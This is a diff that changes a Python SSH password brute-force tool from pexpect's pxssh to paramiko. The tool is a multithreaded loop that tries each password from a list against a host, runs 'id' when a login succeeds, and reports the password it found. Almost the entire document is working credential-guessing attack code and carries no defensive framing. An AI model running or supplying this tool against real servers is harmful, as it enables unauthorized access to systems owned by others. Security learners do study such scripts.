@@ -1,4 +1,4 @@
-import pexpect.pxssh as pxssh
+import paramiko
 import optparse
 import time
 import threading
@@ -11,10 +11,13 @@ fails = 0
 def connect(host, user, password, release):
     global found, fails
     try:
-        s = pxssh.pxssh()
-        s.login(host, user, password)
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(host,22,user,password,timeout=5)
+        stdin, stdout, stderr = ssh.exec_command('id')
         print("[+] Password Found: {}".format(password))
         found = True
+        ssh.close()
     except Exception as e:
         if "read_nonblocking" in str(e):
             fails += 1
@@ -53,7 +56,7 @@ def main():
             connection_lock.acquire()
             password = line.strip("\r\n")
             print("[-] Testing: {}".format(password))
-            t = threading.Thread(target=connect, args=(host, user, password, True))
+            t = threading.Thread(target=connect, args=(target_host, user, password, True))
             child = t.start()
 
 if __name__ == "__main__":
